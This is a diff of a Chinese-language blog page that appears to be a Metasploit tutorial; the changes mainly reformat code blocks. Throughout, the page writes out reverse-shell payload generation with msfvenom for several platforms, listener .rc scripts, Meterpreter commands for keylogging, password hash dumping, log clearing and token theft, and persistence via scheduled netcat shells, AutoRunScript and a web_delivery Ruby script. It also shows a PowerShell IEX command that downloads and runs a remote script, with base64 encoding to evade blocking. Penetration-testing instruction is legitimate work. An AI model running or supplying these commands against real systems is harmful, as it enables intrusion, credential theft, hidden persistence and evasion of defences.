@@ -286,7 +286,7 @@
             <audio id="bgm" autoplay="autoplay" loop="loop" src="https://cache-1253916356.file.myqcloud.com/Black%20Lab%20-%20This%20Night.mp3"></audio>
         
     
-</head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
 
 
     
@@ -567,18 +567,43 @@ https://www.rapid7.com
 <li>开始攻击：<code>exploit</code></li>
 <li>退出当前模块:<code>back</code></li>
 <li>退出msf : <code>exit</code></li>
-<li>使用.rc脚本自动化处理<br>如创建<code>listener.rc</code>文件写入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST &lt;Your Vps&apos;s IP&gt;</div><div class="line">set LPORT &lt;Your Port&gt;</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j-z</div></pre></td></tr></table></figure>
-</li>
+<li>使用.rc脚本自动化处理<br>如创建<code>listener.rc</code>文件写入<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST &lt;Your Vps&#39;s IP&gt;
+set LPORT &lt;Your Port&gt;
+set ExitOnSession false
+exploit -j-z
+</code></pre>使用时运行<code>msfconsole -r /opt/listner.rc</code>即可自动执行.rc文件内的命令省去频繁操作</li>
 </ul>
-<p>使用时运行<code>msfconsole -r /opt/listner.rc</code>即可自动执行.rc文件内的命令省去频繁操作</p>
 <hr>
 <ul>
-<li>搜索时出现[!] Database not connected or cache not built, using slow search<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">msf &gt; db_status</div><div class="line">service postgresql start</div><div class="line">sercice metasploit start</div><div class="line">msf &gt; db_rebuild_cache</div></pre></td></tr></table></figure>
-</li>
+<li>搜索时出现[!] Database not connected or cache not built, using slow search<pre><code>  msf &gt; db_status
+  service postgresql start
+  sercice metasploit start
+  msf &gt; db_rebuild_cache
+</code></pre><h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><strong>help参数</strong></li>
 </ul>
-<h2 id="Msfvenom"><a href="#Msfvenom" class="headerlink" title="Msfvenom"></a>Msfvenom</h2><p><strong>help参数</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">Options:</div><div class="line">    -p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;#039;-&amp;#039;或者stdin指定</div><div class="line">    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</div><div class="line">    -n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度</div><div class="line">    -f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</div><div class="line">    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）</div><div class="line">    -a, --arch       &lt;architecture&gt;  指定payload的目标架构</div><div class="line">        --platform   &lt;platform&gt;      指定payload的目标平台</div><div class="line">    -s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度</div><div class="line">    -b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;</div><div class="line">    -i, --iterations &lt;count&gt;         指定payload的编码次数</div><div class="line">    -c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件</div><div class="line">    -x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板</div><div class="line">    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">        --payload-options            列举payload的标准选项</div><div class="line">    -o, --out   &lt;path&gt;               保存payload</div><div class="line">    -v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式</div><div class="line">        --shellest                   最小化生成payload</div><div class="line">    -h, --help                       查看帮助选项</div><div class="line">        --help-formats               查看msf支持的输出格式列表</div></pre></td></tr></table></figure>
-<p>生成payload，有有两个必须的选项：-p -f </p>
+<pre><code>Options:
+    -p, --payload    &lt;payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&amp;#039;-&amp;#039;或者stdin指定
+    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all
+    -n, --nopsled    &lt;length&gt;        为payload预先指定一个NOP滑动长度
+    -f, --format     &lt;format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+    -a, --arch       &lt;architecture&gt;  指定payload的目标架构
+        --platform   &lt;platform&gt;      指定payload的目标平台
+    -s, --space      &lt;length&gt;        设定有效攻击荷载的最大长度
+    -b, --bad-chars  &lt;list&gt;          设定规避字符集，比如: &amp;#039;\x00\xff&amp;#039;
+    -i, --iterations &lt;count&gt;         指定payload的编码次数
+    -c, --add-code   &lt;path&gt;          指定一个附加的win32 shellcode文件
+    -x, --template   &lt;path&gt;          指定一个自定义的可执行文件作为模板
+    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+        --payload-options            列举payload的标准选项
+    -o, --out   &lt;path&gt;               保存payload
+    -v, --var-name &lt;name&gt;            指定一个自定义的变量，以确定输出格式
+        --shellest                   最小化生成payload
+    -h, --help                       查看帮助选项
+        --help-formats               查看msf支持的输出格式列表
+</code></pre><p>生成payload，有有两个必须的选项：-p -f </p>
 <p>使用-p 来指定要使用的payload。</p>
 <p>可以使用下面的命令来查看所有msf可用的payload列表 </p>
 <pre><code>msfvenom -l payloads
@@ -592,32 +617,32 @@ https://www.rapid7.com
 <ul>
 <li>Windows</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker&apos;s IP] LPORT=4444 -f exe -o /tmp/my_payload.exe</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attacker&#39;s IP] LPORT=4444 -f exe -o /tmp/my_payload.exe
+</code></pre><ul>
 <li>Linux</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; root.elf</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f elf &gt; root.elf
+</code></pre><ul>
 <li>Mac</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f macho &gt; shell.macho</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f macho &gt; shell.macho
+</code></pre><ul>
 <li>Bash</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.sh
+</code></pre><ul>
 <li>PHP</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.php
+</code></pre><ul>
 <li>JSP</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp</div></pre></td></tr></table></figure>
-<ul>
+<pre><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.jsp
+</code></pre><ul>
 <li>Python</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py</div></pre></td></tr></table></figure>
-<p><strong>对payload进行编码</strong></p>
+<pre><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f raw &gt; shell.py
+</code></pre><p><strong>对payload进行编码</strong></p>
 <p>如果你使用了-b选项（设定了规避字符集），会自动调用编码器。</p>
 <p>其他情况下，你需要使用-e选项来使用编码模块，例如：</p>
 <pre><code>msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw
@@ -650,12 +675,81 @@ https://www.rapid7.com
 <li>小技巧,使用命令<code>set ExitOnSession false</code>为保持会话存活,可以同时接受多个sessions </li>
 </ul>
 <hr>
-<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><strong>核心命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">? – 帮助菜单</div><div class="line">background – 将当前会话移动到背景</div><div class="line">bgkill – 杀死一个背景 meterpreter 脚本</div><div class="line">bglist – 提供所有正在运行的后台脚本的列表</div><div class="line">bgrun – 作为一个后台线程运行脚本</div><div class="line">channel – 显示活动频道</div><div class="line">close – 关闭通道</div><div class="line">exit – 终止 meterpreter 会话</div><div class="line">help – 帮助菜单</div><div class="line">info - </div><div class="line">interact – 与通道进行交互</div><div class="line">irb – 进入 Ruby 脚本模式</div><div class="line">migrate – 移动到一个指定的 PID 的活动进程</div><div class="line">quit – 终止 meterpreter 会话</div><div class="line">read – 从通道读取数据</div><div class="line">run – 执行以后它选定的 meterpreter 脚本</div><div class="line">use – 加载 meterpreter 的扩展</div><div class="line">write – 将数据写入到一个通道</div></pre></td></tr></table></figure></p>
-<p><strong>文件系统命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cat -读取并输出到标准输出文件的内容</div><div class="line">cd -更改目录对受害人</div><div class="line">del -删除文件对受害人</div><div class="line">download-从受害者系统文件下载</div><div class="line">search - 在目标主机文件系统上查找搜索文件例如：search  -d  c:\\  -f  *.doc  在目标主机C盘下搜索doc文档</div><div class="line">edit-用 vim编辑文件</div><div class="line">getlwd -打印本地目录</div><div class="line">getwd -打印工作目录</div><div class="line">lcd -更改本地目录</div><div class="line">lpwd -打印本地目录</div><div class="line">ls -列出在当前目录中的文件列表</div><div class="line">mkdir -在受害者系统上的创建目录</div><div class="line">pwd -输出工作目录</div><div class="line">rm -删除文件</div><div class="line">rmdir -受害者系统上删除目录</div><div class="line">upload-从攻击者的系统往受害者系统上传文件</div></pre></td></tr></table></figure></p>
-<p><strong>网络命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。</div><div class="line">portfwd -端口转发 例如：portfwd  add -l  1122 -p 3389 -r  192.168.250.176把目标主机192.168.250.176的3389端口转发到1122端口</div><div class="line">route -查看或加入受害者路由表  route add 5.5.5.0 255.255.255.0 1 用sessions 1会话加入指定网段</div><div class="line">arp - 显示主机ARP缓存</div><div class="line">getproxy - 显示当前代理配置</div><div class="line">netstat - 显示网络连接</div></pre></td></tr></table></figure></p>
-<p><strong>系统命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">clearev -清除了受害者的计算机上的事件日志</div><div class="line">drop_token -被盗的令牌</div><div class="line">execute-执行命令 在目标主机上运行某个程序 execute  -f  notepad.exe 行目标主机上的记事本程序 隐藏后台执行，加参数-H</div><div class="line">getpid -获取当前进程 ID (PID)</div><div class="line">getprivs -尽可能获取尽可能多的特权</div><div class="line">getenv        获取一个或多个环境变量值</div><div class="line">localtime     显示目标系统的本地日期和时间</div><div class="line">pgrep         按名称显示进程</div><div class="line">pkill         按名称终止进程</div><div class="line">getuid -获取作为运行服务器的用户</div><div class="line">kill -终止指定 PID 的进程</div><div class="line">ps -列出正在运行的进程</div><div class="line">reboot-重新启动受害人的计算机</div><div class="line">reg -与受害人的注册表进行交互</div><div class="line">rev2self -在受害者机器上调用 RevertToSelf()</div><div class="line">shell -在受害者计算机上打开一个shell</div><div class="line">shutdown-关闭了受害者的计算机</div><div class="line">steal_token -试图窃取指定的 (PID) 进程的令牌</div><div class="line">suspend - 暂停或恢复进程列表</div><div class="line">sysinfo -获取有关受害者计算机操作系统和名称等的详细信息</div></pre></td></tr></table></figure></p>
-<p><strong>用户界面命令</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">enumdesktops -列出所有可访问台式机</div><div class="line">getdesktop -获取当前的 meterpreter 桌面</div><div class="line">idletime -检查长时间以来，受害者系统空闲进程</div><div class="line">keyscan_dump -键盘记录软件的内容转储</div><div class="line">keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件</div><div class="line">keyscan_stop -停止键盘记录软件</div><div class="line">screenshot-抓去 meterpreter 桌面的屏幕截图</div><div class="line">set_desktop -更改 meterpreter 桌面</div><div class="line">uictl -启用用户界面组件的一些控件</div></pre></td></tr></table></figure></p>
-<p><strong>提权命令</strong></p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p><strong>核心命令</strong></p>
+<pre><code>? – 帮助菜单
+background – 将当前会话移动到背景
+bgkill – 杀死一个背景 meterpreter 脚本
+bglist – 提供所有正在运行的后台脚本的列表
+bgrun – 作为一个后台线程运行脚本
+channel – 显示活动频道
+close – 关闭通道
+exit – 终止 meterpreter 会话
+help – 帮助菜单
+info - 
+interact – 与通道进行交互
+irb – 进入 Ruby 脚本模式
+migrate – 移动到一个指定的 PID 的活动进程
+quit – 终止 meterpreter 会话
+read – 从通道读取数据
+run – 执行以后它选定的 meterpreter 脚本
+use – 加载 meterpreter 的扩展
+write – 将数据写入到一个通道
+</code></pre><p><strong>文件系统命令</strong></p>
+<pre><code>cat -读取并输出到标准输出文件的内容
+cd -更改目录对受害人
+del -删除文件对受害人
+download-从受害者系统文件下载
+search - 在目标主机文件系统上查找搜索文件例如：search  -d  c:\\  -f  *.doc  在目标主机C盘下搜索doc文档
+edit-用 vim编辑文件
+getlwd -打印本地目录
+getwd -打印工作目录
+lcd -更改本地目录
+lpwd -打印本地目录
+ls -列出在当前目录中的文件列表
+mkdir -在受害者系统上的创建目录
+pwd -输出工作目录
+rm -删除文件
+rmdir -受害者系统上删除目录
+upload-从攻击者的系统往受害者系统上传文件
+</code></pre><p><strong>网络命令</strong></p>
+<pre><code>ipconfig -显示网络接口的关键信息，包括 IP 地址、 等。
+portfwd -端口转发 例如：portfwd  add -l  1122 -p 3389 -r  192.168.250.176把目标主机192.168.250.176的3389端口转发到1122端口
+route -查看或加入受害者路由表  route add 5.5.5.0 255.255.255.0 1 用sessions 1会话加入指定网段
+arp - 显示主机ARP缓存
+getproxy - 显示当前代理配置
+netstat - 显示网络连接
+</code></pre><p><strong>系统命令</strong></p>
+<pre><code>clearev -清除了受害者的计算机上的事件日志
+drop_token -被盗的令牌
+execute-执行命令 在目标主机上运行某个程序 execute  -f  notepad.exe 行目标主机上的记事本程序 隐藏后台执行，加参数-H
+getpid -获取当前进程 ID (PID)
+getprivs -尽可能获取尽可能多的特权
+getenv        获取一个或多个环境变量值
+localtime     显示目标系统的本地日期和时间
+pgrep         按名称显示进程
+pkill         按名称终止进程
+getuid -获取作为运行服务器的用户
+kill -终止指定 PID 的进程
+ps -列出正在运行的进程
+reboot-重新启动受害人的计算机
+reg -与受害人的注册表进行交互
+rev2self -在受害者机器上调用 RevertToSelf()
+shell -在受害者计算机上打开一个shell
+shutdown-关闭了受害者的计算机
+steal_token -试图窃取指定的 (PID) 进程的令牌
+suspend - 暂停或恢复进程列表
+sysinfo -获取有关受害者计算机操作系统和名称等的详细信息
+</code></pre><p><strong>用户界面命令</strong></p>
+<pre><code>enumdesktops -列出所有可访问台式机
+getdesktop -获取当前的 meterpreter 桌面
+idletime -检查长时间以来，受害者系统空闲进程
+keyscan_dump -键盘记录软件的内容转储
+keyscan_start -启动时与如 Word 或浏览器的进程相关联的键盘记录软件
+keyscan_stop -停止键盘记录软件
+screenshot-抓去 meterpreter 桌面的屏幕截图
+set_desktop -更改 meterpreter 桌面
+uictl -启用用户界面组件的一些控件
+</code></pre><p><strong>提权命令</strong></p>
 <pre><code>getsystem -获得系统管理员权限
 </code></pre><p><strong>密码转储命令</strong></p>
 <pre><code>hashdump -抓去哈希密码 (SAM) 文件中的值
@@ -717,7 +811,7 @@ metasploit/scripts/meterpreter/schtasksabuse.rb
 <p>使用举例：</p>
 <p>scheduleme</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/ac2102d62ab34bd6a3fa.png" alt=""></p>
-<pre><code>run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; #上传nc并创建计划任务每一分钟执行一次 &apos;nc -e cmd.exe -L -p 8080&apos;
+<pre><code>run scheduleme -m 1 -e /tmp/nc.exe -o &quot;-e cmd.exe -L -p 8080&quot; #上传nc并创建计划任务每一分钟执行一次 &#39;nc -e cmd.exe -L -p 8080&#39;
 run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分钟执行一次打开计算器命令
 </code></pre><p>其他参数有兴趣自己看看就不详细介绍了</p>
 <p>schtasksabuse</p>
@@ -732,8 +826,14 @@ run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分
 <p>当然，MSF持续控制的脚本还有几个，这里就不一一介绍了。</p>
 <h3 id="0x02-Autorunscript"><a href="#0x02-Autorunscript" class="headerlink" title="0x02 Autorunscript"></a>0x02 Autorunscript</h3><p>说到要自动运行脚本，离不了autorunscript。autorunscript是一个十分强大的脚本，可以让我们在生成会话的同时，执行指定的操作。现在可以直接通过autorunscript来直接调用的脚本已经有66个，目录在metasploit/scripts/meterpreter，包括屏幕截图，获取环境变量等等，还有我们常用的migrate，uploadexec等。</p>
 <p>举个例子，如果我们想在获取到会话的同时，执行persistence进行留后门操作可以直接这样：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.2.101</div><div class="line">set LPORT 5555</div><div class="line">set ExitOnSession false</div><div class="line">set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
-<p>当生成会话以后，自动执行persistence，结果就像这样：</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.2.101
+set LPORT 5555
+set ExitOnSession false
+set AutoRunScript persistence -r 192.168.2.101 -p 5556 -U -X -i 30
+exploit -j -z
+</code></pre><p>当生成会话以后，自动执行persistence，结果就像这样：</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/f4108d3f9ddfa8026763.png" alt=""></p>
 <p>当然，同样可以设置metsvc</p>
 <pre><code>set AutoRunScript metsvc -A
@@ -752,12 +852,52 @@ run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/b899cac70ada5183c21a.png" alt=""></p>
 <p>此脚本可用来执行CMD命令，有一个缺点就是会一直等待执行的程序退出以返回结果。</p>
 <h3 id="0x03-Resource-scripts"><a href="#0x03-Resource-scripts" class="headerlink" title="0x03 Resource scripts"></a>0x03 Resource scripts</h3><p>除了使用以上Autorunscript，使用Resource 脚本也是可以的，通常我们常见的rc脚本内容是这样的：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.1.184</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j -z</div></pre></td></tr></table></figure>
-<p>将以上内容保存为1.rc，然后执行如下命令：</p>
+<pre><code>use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.184
+set ExitOnSession false
+exploit -j -z
+</code></pre><p>将以上内容保存为1.rc，然后执行如下命令：</p>
 <pre><code>msfconsole -r 1.rc
 </code></pre><p>自动输入命令而省去了我们一条一条输入的繁琐。其实，rc文件里面也可以写ruby代码的，一个简单的示例如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/script/web_delivery</div><div class="line">set target 2</div><div class="line">set payload windows/meterpreter/reverse_tcp</div><div class="line">set lhost 192.168.2.101</div><div class="line">set lport 6666</div><div class="line">set uripath /</div><div class="line">set ExitOnSession false</div><div class="line">exploit -j</div><div class="line">&lt;ruby&gt;</div><div class="line">    sleep(1)</div><div class="line">    print_status(&quot;Waiting on an incoming sessions...&quot;)</div><div class="line">    while (true)</div><div class="line">        framework.sessions.each_pair do |sid,s|</div><div class="line">            thost = s.tunnel_peer.split(&quot;:&quot;)[0]</div><div class="line">            # Ensure that stdapi has been loaded before running</div><div class="line">            if s.ext.aliases[&apos;stdapi&apos;]</div><div class="line">                sleep(2)</div><div class="line">                print_status(&quot;run screenshot to session #&#123;sid&#125; #&#123;thost&#125;...&quot;)</div><div class="line">                s.console.run_single(&quot;screenshot&quot;)</div><div class="line">                sleep(2)</div><div class="line">                print_status(&quot;Executing persistent command...&quot;)</div><div class="line">                s.console.run_single(&quot;run persistence -r 192.168.2.101 -p 5556 -U -i 30&quot;)</div><div class="line">                sleep(4)</div><div class="line">                print_status(&quot;Closing session #&#123;sid&#125; #&#123;thost&#125;...&quot;)</div><div class="line">                s.kill</div><div class="line">                print_status(&quot;Waiting on an incoming sessions...&quot;)</div><div class="line">            else</div><div class="line">                print_status(&quot;Session #&#123;sid&#125; #&#123;thost&#125; active, but not yet configured&quot;)</div><div class="line">                sleep(15)</div><div class="line">            end</div><div class="line"></div><div class="line">        end</div><div class="line">        sleep(4)</div><div class="line">    end</div><div class="line"></div><div class="line">    print_status(&quot;All done&quot;)</div><div class="line">&lt;/ruby&gt;</div></pre></td></tr></table></figure>
-<p>使用以上Resource的效果是，开启</p>
+<pre><code>use exploit/multi/script/web_delivery
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set lhost 192.168.2.101
+set lport 6666
+set uripath /
+set ExitOnSession false
+exploit -j
+&lt;ruby&gt;
+    sleep(1)
+    print_status(&quot;Waiting on an incoming sessions...&quot;)
+    while (true)
+        framework.sessions.each_pair do |sid,s|
+            thost = s.tunnel_peer.split(&quot;:&quot;)[0]
+            # Ensure that stdapi has been loaded before running
+            if s.ext.aliases[&#39;stdapi&#39;]
+                sleep(2)
+                print_status(&quot;run screenshot to session #{sid} #{thost}...&quot;)
+                s.console.run_single(&quot;screenshot&quot;)
+                sleep(2)
+                print_status(&quot;Executing persistent command...&quot;)
+                s.console.run_single(&quot;run persistence -r 192.168.2.101 -p 5556 -U -i 30&quot;)
+                sleep(4)
+                print_status(&quot;Closing session #{sid} #{thost}...&quot;)
+                s.kill
+                print_status(&quot;Waiting on an incoming sessions...&quot;)
+            else
+                print_status(&quot;Session #{sid} #{thost} active, but not yet configured&quot;)
+                sleep(15)
+            end
+
+        end
+        sleep(4)
+    end
+
+    print_status(&quot;All done&quot;)
+&lt;/ruby&gt;
+</code></pre><p>使用以上Resource的效果是，开启</p>
 <pre><code>exploit/multi/script/web_delivery
 </code></pre><p>进行配置并开启监听，当产生一个会话以后，自动执行screenshot以及persistent操作，最后关闭当前会话继续等待。效果如下图:</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/b59e35fd9e4aea684095.png" alt=""></p>
@@ -768,18 +908,18 @@ run scheduleme -m 1 -c &quot;cmd /c calc.exe&quot; # 创建计划任务每一分
 </code></pre><p>3、测试shell下直接执行(被拦截):</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/a8b7124ed07af9fcfe78.png" alt=""></p>
 <p>4、将以上命令写入schtasks.ps1，然后通过IEX下载执行，这种方式就不会被拦截了：</p>
-<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&apos;);&quot;
+<pre><code>powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&#39;);&quot;
 </code></pre><p>测试如下图：</p>
 <p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/46b1ec8d8bb7c92f5798.gif" alt=""></p>
 <p>未被拦截的情况下成功建立计划任务。</p>
 <p>5、将命令写入autorunscript：</p>
 <p>由于命令中存在引号，可以通过编码方式解决，详细如下：</p>
-<pre><code>echo &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&apos;);&quot; | iconv --to-code UTF-16LE |base64
+<pre><code>echo &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/DemoShell/schtasks.ps1&#39;);&quot; | iconv --to-code UTF-16LE |base64
 </code></pre><p><img src="http://www.evil0x.com/wp-content/uploads/2016/06/6cbf8ac05489a9244f4e.png" alt=""></p>
 <p>最后执行的命令为：</p>
